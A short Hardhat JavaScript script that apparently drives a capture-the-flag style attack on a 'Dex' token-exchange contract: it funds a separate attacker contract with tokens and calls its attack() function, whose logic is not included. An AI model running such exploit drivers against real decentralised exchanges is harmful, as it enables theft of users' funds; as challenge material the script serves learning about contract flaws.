const { ethers } = require("hardhat");

const INSTANCE_ADDRESS = "0x23DF207B34bb236C20B98EAf77239Fc0ec0853b8";
const ATTACKER_ADDRESS = "0xe98e1ed59c9325b453c6123CF3C19F5cB240A8A8";

async function main() {
    const dexAttacker = await ethers.getContractAt("DexAttack", ATTACKER_ADDRESS);
    const instance = await ethers.getContractAt("Dex", INSTANCE_ADDRESS);
    const token1 = await ethers.getContractAt("ERC20", instance.token1());
    const token2 = await ethers.getContractAt("ERC20", instance.token2());


    // Transfer tokens to the attacker contract.
    const transferTx1 = await token1.transfer(ATTACKER_ADDRESS, 10);
    const transferTx2 = await token2.transfer(ATTACKER_ADDRESS, 10);
    await transferTx1.wait();
    await transferTx2.wait();
    console.log("transferred to attacker");    
    
    // Attack
    const tx = await dexAttacker.attack();
    console.log(await tx.wait());
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});